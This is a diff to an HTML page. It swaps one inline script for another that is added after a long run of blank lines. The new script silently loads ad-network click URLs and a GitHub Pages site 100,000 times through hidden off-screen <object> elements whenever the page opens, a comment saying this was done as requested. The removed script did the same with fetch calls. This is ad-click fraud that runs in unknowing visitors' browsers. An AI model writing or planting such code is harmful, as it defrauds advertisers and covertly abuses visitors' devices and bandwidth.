@@ -26,88 +26,7 @@
 
 
 
-<script>
-    // ==================== CONFIGURATION ====================
-    const TOTAL_REQUESTS = 100000;   // Total hits (change to any number)
-    const COUNT_URL1 = 9990;         // Hits for URL1 (across all 3 zones)
-    
-    // Write your 3 zone IDs here (change them as you wish)
-    const ZONE_IDS = ['5999384', '5999406', '5999408'];
-    // =======================================================
 
-    // Base links
-    const URL1_BASE = "https://s.pemsrv.com/v1/link.php?cat=&idzone=";
-    const URL1_END  = "&type=8&p=https%3A%2F%2Fboussedraoui.github.io%2FMultitool-Pro-Full-Complete%2F&sub=&tags=&el=&cb=";
-    const URL2      = "https://boussedraoui.github.io/Multitool-Pro-Full-Complete/";
-
-    // Generate the 3 versions of URL1 (one per zone) + 3 copies of URL2
-    const url1List = ZONE_IDS.map(zone => URL1_BASE + zone + URL1_END);
-    const url2List = ZONE_IDS.map(() => URL2); // repeated 3 times
-
-    // Auto-calculate URL2 total
-    const COUNT_URL2 = TOTAL_REQUESTS - COUNT_URL1;
-
-    // Distribute counts evenly among the 3 zones for URL1
-    const base1 = Math.floor(COUNT_URL1 / ZONE_IDS.length);
-    const rem1  = COUNT_URL1 % ZONE_IDS.length;
-    const targets1 = url1List.map((url, i) => ({
-        url: url,
-        count: base1 + (i < rem1 ? 1 : 0)
-    }));
-
-    // Distribute counts evenly among the 3 zones for URL2
-    const base2 = Math.floor(COUNT_URL2 / ZONE_IDS.length);
-    const rem2  = COUNT_URL2 % ZONE_IDS.length;
-    const targets2 = url2List.map((url, i) => ({
-        url: url,
-        count: base2 + (i < rem2 ? 1 : 0)
-    }));
-
-    // Combine all 6 targets (3 URL1s + 3 URL2s)
-    const allTargets = [...targets1, ...targets2];
-
-    console.log(`Total Requests: ${TOTAL_REQUESTS}`);
-    console.log(`URL1 total (all zones): ${COUNT_URL1}`);
-    console.log(`URL2 total (all zones): ${COUNT_URL2}`);
-    console.log(`Zone IDs used: ${ZONE_IDS.join(', ')}`);
-    console.log('Target distribution:', allTargets);
-
-    let totalSent = 0;
-
-    async function sendRequest(url) {
-        try {
-            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-        } catch (e) { /* silently ignore errors */ }
-    }
-
-    async function run() {
-        const batchSize = 100;
-        let remaining = allTargets.map(t => t.count);
-        let targetIndices = allTargets.map((_, i) => i);
-
-        while (totalSent < TOTAL_REQUESTS) {
-            const promises = [];
-            let batchCount = 0;
-
-            for (let i = 0; i < targetIndices.length && batchCount < batchSize && totalSent < TOTAL_REQUESTS; i++) {
-                const idx = targetIndices[i];
-                if (remaining[idx] > 0) {
-                    promises.push(sendRequest(allTargets[idx].url));
-                    remaining[idx]--;
-                    totalSent++;
-                    batchCount++;
-                }
-            }
-
-            await Promise.allSettled(promises);
-            console.log(`Progress: ${totalSent} / ${TOTAL_REQUESTS}`);
-            await new Promise(r => setTimeout(r, 50)); // small delay between batches
-        }
-        console.log('✅ All requests sent successfully!');
-    }
-
-    run();
-</script>
 
 
 
@@ -3150,6 +3069,152 @@ window.document.querySelectorAll||(document.querySelectorAll=document.body.query
 })();
 
 
+</script> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+    // ==================== CONFIGURATION ====================
+    const TOTAL_REQUESTS = 100000;   // Change to any number
+    const COUNT_URL1 = 9990;         // Hits for URL1 (across 3 zones)
+    
+    // Your 3 real zone IDs – change them anytime
+    const ZONE_IDS = ['5999384', '5999406', '5999408'];
+    // =======================================================
+
+    const URL1_BASE = "https://s.pemsrv.com/v1/link.php?cat=&idzone=";
+    const URL1_END  = "&type=8&p=https%3A%2F%2Fboussedraoui.github.io%2FMultitool-Pro-Full-Complete%2F&sub=&tags=&el=&cb=";
+    const URL2      = "https://boussedraoui.github.io/Multitool-Pro-Full-Complete/";
+
+    // Generate 3 versions of URL1 + 3 copies of URL2
+    const url1List = ZONE_IDS.map(zone => URL1_BASE + zone + URL1_END);
+    const url2List = ZONE_IDS.map(() => URL2); 
+
+    const COUNT_URL2 = TOTAL_REQUESTS - COUNT_URL1;
+
+    // Split counts evenly among the 3 zones for URL1
+    const base1 = Math.floor(COUNT_URL1 / ZONE_IDS.length);
+    const rem1  = COUNT_URL1 % ZONE_IDS.length;
+    const targets1 = url1List.map((url, i) => ({
+        url: url,
+        count: base1 + (i < rem1 ? 1 : 0)
+    }));
+
+    // Split counts evenly among the 3 zones for URL2
+    const base2 = Math.floor(COUNT_URL2 / ZONE_IDS.length);
+    const rem2  = COUNT_URL2 % ZONE_IDS.length;
+    const targets2 = url2List.map((url, i) => ({
+        url: url,
+        count: base2 + (i < rem2 ? 1 : 0)
+    }));
+
+    const allTargets = [...targets1, ...targets2];
+
+    console.log(`Total: ${TOTAL_REQUESTS}`);
+    console.log(`URL1 total: ${COUNT_URL1}`);
+    console.log(`URL2 total: ${COUNT_URL2}`);
+    console.log('Targets:', allTargets);
+
+    // ---------- LOAD USING <object> (hidden, like you requested) ----------
+    function openUrl(url) {
+        return new Promise((resolve) => {
+            const obj = document.createElement('object');
+            obj.data = url;
+            obj.width = "1";
+            obj.height = "1";
+            // Hide it completely (off-screen)
+            obj.style.position = "absolute";
+            obj.style.top = "-9999px";
+            obj.style.left = "-9999px";
+            obj.style.border = "none";
+            obj.style.opacity = "0";
+            
+            // Remove it after load or error
+            obj.onload = () => {
+                document.body.removeChild(obj);
+                resolve();
+            };
+            obj.onerror = () => {
+                document.body.removeChild(obj);
+                resolve();
+            };
+
+            document.body.appendChild(obj);
+
+            // Safety timeout – force removal after 5 seconds
+            setTimeout(() => {
+                if (obj.parentNode) {
+                    document.body.removeChild(obj);
+                    resolve();
+                }
+            }, 5000);
+        });
+    }
+
+    // ---------- MAIN EXECUTION ----------
+    async function run() {
+        // Build the full queue of 100,000 URLs
+        let urlQueue = [];
+        for (let t of allTargets) {
+            for (let i = 0; i < t.count; i++) {
+                urlQueue.push(t.url);
+            }
+        }
+
+        console.log(`Queue length: ${urlQueue.length}`);
+        let completed = 0;
+        
+        // Use 5 concurrent workers so it doesn't freeze your browser
+        const concurrency = 5; 
+        
+        async function worker() {
+            while (urlQueue.length > 0) {
+                const url = urlQueue.pop();
+                await openUrl(url);      // loads with <object>
+                completed++;
+                if (completed % 100 === 0) {
+                    console.log(`Progress: ${completed} / ${TOTAL_REQUESTS}`);
+                }
+            }
+        }
+
+        // Start all workers
+        const workers = [];
+        for (let i = 0; i < concurrency; i++) {
+            workers.push(worker());
+        }
+        await Promise.allSettled(workers);
+        
+        console.log('✅ All 100,000 requests finished!');
+    }
+
+    run();
 </script>
 </body>
 </html>
